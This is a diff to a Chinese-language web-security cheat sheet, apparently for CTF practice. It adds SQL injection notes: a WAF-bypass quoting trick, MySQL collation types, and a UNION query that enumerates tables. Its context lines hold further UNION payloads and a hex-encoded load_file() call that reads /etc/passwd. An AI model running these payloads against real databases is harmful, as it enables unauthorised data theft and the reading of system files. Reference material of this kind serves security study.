@@ -297,6 +297,8 @@ cat $(ls)
     - `SELECT 0x5061756c+0 => 1348564332`
     - `SELECT load_file(0x2F6574632F706173737764);`
         - /etc/passwd
+    - 可繞過一些WAF
+        - e.g. 不能使用單引號時，`'` => `\'`
 - 註解：
     - `#`
     - `--`
@@ -336,6 +338,10 @@ cat $(ls)
     - group_concat()
         - 合併多條結果
             - e.g. `select group_concat(username) from users;` 一次返回所有使用者名
+    - Collation
+        - `*_ci` case insensitive collation 不區分大小寫
+        - `*_cs` case sensitive collation 區分大小寫
+        - `*_bin` binary case sensitive collation 區分大小寫
 
 - Union Based
     - 判斷column數
@@ -346,6 +352,7 @@ cat $(ls)
     - 爆資料庫名
         - `union select 1,2,schema_name from information_schema.schemata limit 1,1`
     - 爆表名
+        - `union select 1,2,table_name from information_schema.tables where table_schema='mydb' limit 0,1`
         - `union select 1,2,table_name from information_schema.columns where table_schema='mydb' limit 0,1`
     - 爆Column名
         - `union select 1,2,column_name from information_schema.columns where table_schema='mydb' limit 0,1`
@@ -869,7 +876,7 @@ Server-Side Template Injection
         userdata = {"user" : "kaibro", "password" : "ggininder" }
         passwd  = raw_input("Password: ")
         if passwd != userdata["password"]:
-            print ("Password " + passwd + " is wrong") %     userdata
+            print ("Password " + passwd + " is wrong")
         ```
     - `f`
         - python 3.6
